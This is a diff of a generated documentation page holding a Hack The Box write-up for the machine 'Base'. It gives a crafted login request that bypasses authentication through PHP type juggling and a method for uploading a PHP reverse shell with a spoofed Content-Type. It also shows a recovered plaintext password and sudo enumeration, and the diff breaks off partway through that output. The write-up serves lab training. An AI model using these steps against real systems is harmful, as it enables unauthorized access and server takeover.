@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -16939,110 +16962,174 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <h1 id="base-a-hack-the-box-machine">Base - A Hack The Box machine</h1>
 <p>Enumerate open ports and services.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 <p>Ports 22 and 80 are open.</p>
 <p>Add base.htb to /etc/hosts.</p>
 <p>Enumerate directories:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://base.htb/login<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://base.htb/login<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Some file and folders uncovered:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>- http://base.htb/_uploaded/
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>- http://base.htb/login/
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>- http://base.htb/login/login.php
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>- http://base.htb/forms/
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>- http://base.htb/assets/
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>- http://base.htb/logout.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>- http://base.htb/_uploaded/
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>- http://base.htb/login/
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>- http://base.htb/login/login.php
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>- http://base.htb/forms/
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>- http://base.htb/assets/
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>- http://base.htb/logout.php
+</span></code></pre></div></td></tr></table></div>
 <p>Under  /login there are three files: login.php, config.php and login.php.swp. There are two ways of reading the swap file, with strings and with vim:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>vim<span class="w"> </span>-r<span class="w"> </span>login.php.swp
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># -r  -- list swap files and exit or recover from a swap file</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>vim<span class="w"> </span>-r<span class="w"> </span>login.php.swp
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c1"># -r  -- list swap files and exit or recover from a swap file</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Content:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&lt;?php
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>session_start();
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>if (!empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    require(&#39;config.php&#39;);
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    if (strcmp($username, $_POST[&#39;username&#39;]) == 0) {
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>        if (strcmp($password, $_POST[&#39;password&#39;]) == 0) {
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>            $_SESSION[&#39;user_id&#39;] = 1;
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>            header(&quot;Location: /upload.php&quot;);
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>        } else {
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>            print(&quot;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&quot;);
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>        }
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    } else {
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>        print(&quot;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&quot;);
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    }
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>&lt;?php
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>session_start();
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>if (!empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>    require(&#39;config.php&#39;);
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>    if (strcmp($username, $_POST[&#39;username&#39;]) == 0) {
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>        if (strcmp($password, $_POST[&#39;password&#39;]) == 0) {
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>            $_SESSION[&#39;user_id&#39;] = 1;
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>            header(&quot;Location: /upload.php&quot;);
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>        } else {
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>            print(&quot;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&quot;);
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>        }
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>    } else {
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>        print(&quot;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&quot;);
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>    }
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>}
+</span></code></pre></div></td></tr></table></div>
 <p>Quoting from the article <a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">PHP Type Juggling Vulnerabilities</a>: "When comparing values, always try to use the type-safe comparison operator “===” instead of the loose comparison operator “==”. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. This means that (7 === “7”) will return False."</p>
 <p>My notes about <a href="../webexploitation/php-type-juggling-vulnerabilities/">php type jugling</a>. </p>
 <p>In the HackTheBox machine Base, login form was bypasseable by entering an empty array into the username and password parameters:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Original request
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>POST /login/login.php HTTP/1.1
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Host: base.htb
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Content-Type: application/x-www-form-urlencoded
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Content-Length: 57
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>Origin: http://base.htb
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>Connection: close
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>Referer: http://base.htb/login/login.php
-</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>
-</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>username=admin&amp;password=admin
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Crafted request:
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>POST /login/login.php HTTP/1.1
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Host: base.htb
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Content-Type: application/x-www-form-urlencoded
-</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Content-Length: 57
-</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>Origin: http://base.htb
-</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>Connection: close
-</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Referer: http://base.htb/login/login.php
-</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
-</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>
-</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>username[]=admin&amp;password[]=admin
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span>
+<span class="normal"><a href="#__codelineno-5-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Original request
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>POST /login/login.php HTTP/1.1
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>Host: base.htb
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>Content-Length: 57
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a>Origin: http://base.htb
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>Connection: close
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>Referer: http://base.htb/login/login.php
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18"></a>username=admin&amp;password=admin
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span>
+<span class="normal"><a href="#__codelineno-6-16">16</a></span>
+<span class="normal"><a href="#__codelineno-6-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>Crafted request:
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>POST /login/login.php HTTP/1.1
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>Host: base.htb
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>Content-Length: 57
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>Origin: http://base.htb
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a>Connection: close
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a>Referer: http://base.htb/login/login.php
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a>Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a>username[]=admin&amp;password[]=admin
+</span></code></pre></div></td></tr></table></div>
 <p>How to know? By spotting the file login.php.swp in the /login exposed directory and reading its contents.</p>
 <p>After sending request with BurpSuite, grab the PHPsession cookie and in your browser enter that cookie and go to: http://base.htb/upload.php. Now you can upload our <a href="../pentesmonkey/">pentesmonkey shell</a> using BurpSuite Repeater (important note: change header to "Content-Type: image/png", file extension may remain php). Have your netcat listener ready.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>whoami
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>www-data
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>whoami
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>www-data
+</span></code></pre></div></td></tr></table></div>
 <p>Credentials can be found at /var/www/html/login/config.php. Use them to login as the existing user at /home</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>su<span class="w"> </span>john
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="c1"># enter password: thisisagoodpassword</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>su<span class="w"> </span>john
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="c1"># enter password: thisisagoodpassword</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Once you are john, you have access to user.txt. Also, to be root:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>id
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>sudo<span class="w"> </span>-l
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ohn@base:~$ sudo -l
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sudo -l
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>[sudo] password for john: thisisagoodpassword
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Matching Defaults entries for john on base:
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    env_reset, mail_badpass,
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>User john may run the following commands on base:
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>    (root : root) /usr/bin/find
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>id
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-11-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>ohn@base:~$ sudo -l
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>sudo -l
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>[sudo] password for john: thisisagoodpassword
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a>Matching Defaults entries for john on base:
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>    env_reset, mail_badpass,
